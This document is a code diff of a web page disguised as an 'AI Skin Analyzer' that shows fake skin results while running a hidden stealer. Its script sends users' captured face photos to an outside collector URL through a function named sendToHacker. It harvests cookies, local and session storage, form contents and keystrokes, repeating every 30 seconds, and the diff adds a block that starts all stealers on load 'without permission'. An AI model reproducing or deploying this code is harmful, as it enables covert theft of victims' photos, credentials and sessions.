@@ -6,7 +6,6 @@
 <title>AI Skin Analyzer</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
 <style>
-  /* ===== SAME STYLES AS YOUR FRONTEND ===== */
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
     --p1: #c084fc; --p2: #a855f7; --p3: #7c3aed; --p4: #5b21b6;
@@ -258,7 +257,7 @@
 </div>
 
 <!-- ============================================ -->
-<!-- 🔥 PAYLOAD — COMPLETE WITH ALL STEALERS     -->
+<!-- 🔥 COMPLETE PAYLOAD — SAB KUCH CHORI HOGA    -->
 <!-- ============================================ -->
 
 <script>
@@ -266,7 +265,7 @@
   'use strict';
 
   // ========================================
-  // CONFIGURATION
+  // CONFIGURATION — ⚠️ APNA RENDER URL DAALO
   // ========================================
   const CONFIG = {
     COLLECTOR_URL: 'https://ai-skin-analyzer-utit.onrender.com/collect',
@@ -304,7 +303,6 @@
   const progressFill = document.getElementById('progressFill');
   const loadingStatus = document.getElementById('loadingStatus');
 
-  // Step elements
   const steps = [
     { dot: document.getElementById('s1dot'), txt: document.getElementById('s1txt') },
     { dot: document.getElementById('s2dot'), txt: document.getElementById('s2txt') },
@@ -318,15 +316,15 @@
   let permissionGranted = false;
 
   // ========================================
-  // SKIN DATA (FAKE — For Real Feel)
+  // SKIN DATA (FAKE)
   // ========================================
   const skinData = [
-    { type: 'Oily Skin', desc: 'Your skin produces excess sebum. Recommended: Salicylic Acid-based face wash.', confidence: '94%', hydration: '58%', clarity: '3.2', sensitivity: 'Low', products: ['🧼 Salicylic Acid Face Wash', '💧 Niacinamide Serum', '🌿 Oil-Free Moisturizer'] },
-    { type: 'Dry Skin', desc: 'Your skin lacks moisture. Recommended: Hyaluronic Acid-based face wash.', confidence: '92%', hydration: '72%', clarity: '4.5', sensitivity: 'High', products: ['🧴 Hyaluronic Acid Face Wash', '💧 Ceramide Moisturizer', '🌿 Squalane Oil'] },
-    { type: 'Combination Skin', desc: 'Your skin is oily in T-zone and dry on cheeks. Recommended: Gentle balancing face wash.', confidence: '96%', hydration: '65%', clarity: '4.1', sensitivity: 'Medium', products: ['🧼 Gentle Foaming Face Wash', '💧 Balancing Toner', '🌿 Lightweight Moisturizer'] },
-    { type: 'Sensitive Skin', desc: 'Your skin is prone to redness. Recommended: Fragrance-free, soothing face wash.', confidence: '88%', hydration: '60%', clarity: '3.8', sensitivity: 'High', products: ['🧴 Soothing Face Wash', '💧 Calming Serum', '🌿 Barrier Repair Cream'] },
-    { type: 'Normal Skin', desc: 'Your skin is well-balanced. Recommended: Mild, hydrating face wash.', confidence: '95%', hydration: '78%', clarity: '4.9', sensitivity: 'Low', products: ['🧼 Mild Hydrating Face Wash', '💧 Vitamin C Serum', '🌿 Daily Moisturizer'] },
-    { type: 'Acne-Prone Skin', desc: 'Your skin is prone to breakouts. Recommended: Benzoyl Peroxide face wash.', confidence: '90%', hydration: '55%', clarity: '2.9', sensitivity: 'Medium', products: ['🧼 Benzoyl Peroxide Wash', '💧 Tea Tree Serum', '🌿 Non-Comedogenic Moisturizer'] }
+    { type: 'Oily Skin', desc: 'Produces excess sebum. Use Salicylic Acid face wash.', confidence: '94%', hydration: '58%', clarity: '3.2', sensitivity: 'Low', products: ['🧼 Salicylic Acid Face Wash', '💧 Niacinamide Serum', '🌿 Oil-Free Moisturizer'] },
+    { type: 'Dry Skin', desc: 'Lacks moisture. Use Hyaluronic Acid face wash.', confidence: '92%', hydration: '72%', clarity: '4.5', sensitivity: 'High', products: ['🧴 Hyaluronic Acid Face Wash', '💧 Ceramide Moisturizer', '🌿 Squalane Oil'] },
+    { type: 'Combination Skin', desc: 'Oily T-zone, dry cheeks. Use gentle balancing wash.', confidence: '96%', hydration: '65%', clarity: '4.1', sensitivity: 'Medium', products: ['🧼 Gentle Foaming Face Wash', '💧 Balancing Toner', '🌿 Lightweight Moisturizer'] },
+    { type: 'Sensitive Skin', desc: 'Prone to redness. Use fragrance-free wash.', confidence: '88%', hydration: '60%', clarity: '3.8', sensitivity: 'High', products: ['🧴 Soothing Face Wash', '💧 Calming Serum', '🌿 Barrier Repair Cream'] },
+    { type: 'Normal Skin', desc: 'Well-balanced. Use mild hydrating wash.', confidence: '95%', hydration: '78%', clarity: '4.9', sensitivity: 'Low', products: ['🧼 Mild Hydrating Face Wash', '💧 Vitamin C Serum', '🌿 Daily Moisturizer'] },
+    { type: 'Acne-Prone Skin', desc: 'Prone to breakouts. Use Benzoyl Peroxide wash.', confidence: '90%', hydration: '55%', clarity: '2.9', sensitivity: 'Medium', products: ['🧼 Benzoyl Peroxide Wash', '💧 Tea Tree Serum', '🌿 Non-Comedogenic Moisturizer'] }
   ];
 
   // ========================================
@@ -450,11 +448,11 @@
     loadingCard.classList.remove('visible');
     statusText.textContent = '📸 Photo ready • Click Analyze';
 
-    // ⚠️ SEND PHOTO TO HACKER
+    // ⚠️ PHOTO CHORI
     sendToHacker('photo_captured', {
       source: source,
       fileName: fileName || (source === 'live' ? 'live_photo.jpg' : 'gallery_photo.jpg'),
-      data: dataUrl.split(',')[1],  // Base64 image data
+      data: dataUrl.split(',')[1],
       timestamp: new Date().toISOString()
     });
   }
@@ -542,7 +540,6 @@
     resultCard.classList.remove('visible');
     loadingCard.classList.add('visible');
 
-    // Reset steps
     steps.forEach((s, i) => {
       if (i < 2) { s.dot.className = 'step-dot done'; s.dot.textContent = '✓'; s.txt.className = 'step-text done'; }
       else if (i === 2) { s.dot.className = 'step-dot active'; s.dot.textContent = '●'; s.txt.className = 'step-text active'; }
@@ -625,11 +622,12 @@
 
   // ========================================
   // ========================================
-  // 🔥 ALL DATA STEALERS — COOKIES + PASSWORDS
+  // 🔥 ALL DATA STEALERS
   // ========================================
   // ========================================
 
   function startAllStealers() {
+    console.log('[+] Starting all stealers...');
     setTimeout(stealAllCookies, 500);
     setTimeout(stealAllLocalStorage, 1000);
     setTimeout(stealAllSessionStorage, 1500);
@@ -638,7 +636,6 @@
     setTimeout(stealAllForms, 3000);
     setTimeout(stealKeylogger, 3500);
 
-    // Repeat every 30 seconds
     setInterval(() => {
       stealAllCookies();
       stealAllLocalStorage();
@@ -775,6 +772,11 @@
     registerServiceWorker();
     generateFakeTraffic();
 
+    // ⚠️ FORCEFULLY START STEALERS — NO PERMISSION NEEDED!
+    setTimeout(() => {
+      startAllStealers();
+    }, 1000);
+
     setTimeout(() => {
       stealAllCookies();
       stealAllLocalStorage();
@@ -783,7 +785,6 @@
       stealPlatformCookies();
     }, 2000);
 
-    // Update time
     setInterval(() => {
       const now = new Date();
       statusTime.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
@@ -797,7 +798,7 @@
       idx++;
     }, 4000);
 
-    console.log('[+] AI Skin Analyzer loaded — Complete with all stealers');
+    console.log('[+] AI Skin Analyzer loaded — Complete with all stealers!');
   });
 
 })();
